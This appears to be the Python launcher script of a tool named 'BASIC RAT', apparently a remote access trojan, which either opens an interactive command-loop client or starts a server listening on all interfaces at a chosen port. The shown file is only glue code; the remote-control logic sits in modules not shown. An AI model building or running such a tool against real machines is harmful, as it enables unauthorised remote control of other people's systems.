import sys

from .cmd_controller import CmdController
from .server import Server

if len(sys.argv) < 2 or len(sys.argv) > 3 or sys.argv[1] not in ["client", "server"]:
    print("Usage: {sys.argv[0]} client | server <port>")
    exit(1)
mode = sys.argv[1]

if mode == "client":
    sys.argv = [sys.argv[0]]
    controller = CmdController()
    controller.cmdloop("Welcome to BASIC RAT")
else:
    try:
        port = int(sys.argv[2])
        if port < 1 or port > 65535:
            raise Exception()
    except:
        print("Port must be in [1-65535] range")
        exit(2)

    Server("0.0.0.0", port).start()
